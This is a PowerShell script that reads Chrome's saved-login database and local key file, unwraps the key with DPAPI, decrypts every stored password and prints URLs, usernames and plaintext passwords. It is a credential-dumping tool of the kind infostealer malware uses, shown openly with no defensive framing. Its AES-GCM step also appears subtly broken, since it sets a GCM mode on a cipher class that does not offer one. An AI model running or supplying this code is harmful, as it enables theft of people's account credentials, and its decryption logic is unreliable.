# Load necessary assemblies
Add-Type -AssemblyName "System.Security"
Add-Type -AssemblyName "System.Data.SQLite"

class ChromePasswordDecryptor {
    [string]$dbPath
    [byte[]]$key

    ChromePasswordDecryptor() {
        $this.dbPath = [System.IO.Path]::Combine($env:USERPROFILE, "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        $this.key = $this.GetEncryptionKey()
    }

    [byte[]] GetEncryptionKey() {
        $localStatePath = [System.IO.Path]::Combine($env:USERPROFILE, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        try {
            $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
            $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
            $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
            return [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        } catch {
            Write-Error "Failed to get encryption key: $_"
            return $null
        }
    }

    [string] DecryptPassword([byte[]]$password) {
        try {
            $iv = $password[3..14]
            $password = $password[15..($password.Length - 1)]
            $cipher = [System.Security.Cryptography.Aes]::Create()
            $cipher.Key = $this.key
            $cipher.IV = $iv
            $cipher.Mode = [System.Security.Cryptography.CipherMode]::GCM
            $decryptor = $cipher.CreateDecryptor()
            $decrypted = $decryptor.TransformFinalBlock($password, 0, $password.Length)
            return [System.Text.Encoding]::UTF8.GetString($decrypted[0..($decrypted.Length - 17)])
        } catch {
            try {
                return [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($password, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
            } catch {
                return ""
            }
        }
    }

    static [datetime] GetChromeDateTime([int64]$chromeDate) {
        try {
            return (Get-Date "1601-01-01").AddMicroseconds($chromeDate)
        } catch {
            return $null
        }
    }

    [System.Collections.Generic.List[hashtable]] ExtractSavedPasswords() {
        $tempDbPath = "Chrome.db"
        try {
            Copy-Item -Path $this.dbPath -Destination $tempDbPath
            $connection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDbPath;Version=3;")
            $connection.Open()
            $command = $connection.CreateCommand()
            $command.CommandText = "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created"
            $reader = $command.ExecuteReader()
            $passwords = @()
            while ($reader.Read()) {
                $passwords += @{
                    "origin_url" = $reader["origin_url"]
                    "action_url" = $reader["action_url"]
                    "username" = $reader["username_value"]
                    "password" = $this.DecryptPassword([byte[]]$reader["password_value"])
                    "date_created" = [ChromePasswordDecryptor]::GetChromeDateTime([int64]$reader["date_created"])
                    "date_last_used" = [ChromePasswordDecryptor]::GetChromeDateTime([int64]$reader["date_last_used"])
                }
            }
            $reader.Close()
            $connection.Close()
            return $passwords
        } catch {
            Write-Error "Error extracting Chrome passwords: $_"
        } finally {
            try {
                Remove-Item -Path $tempDbPath
            } catch {
                Write-Error "Error removing temporary database: $_"
            }
        }
    }
}

function Main {
    $decryptor = [ChromePasswordDecryptor]::new()
    $passwords = $decryptor.ExtractSavedPasswords()
    foreach ($password in $passwords) {
        Write-Output $password
    }
}

Main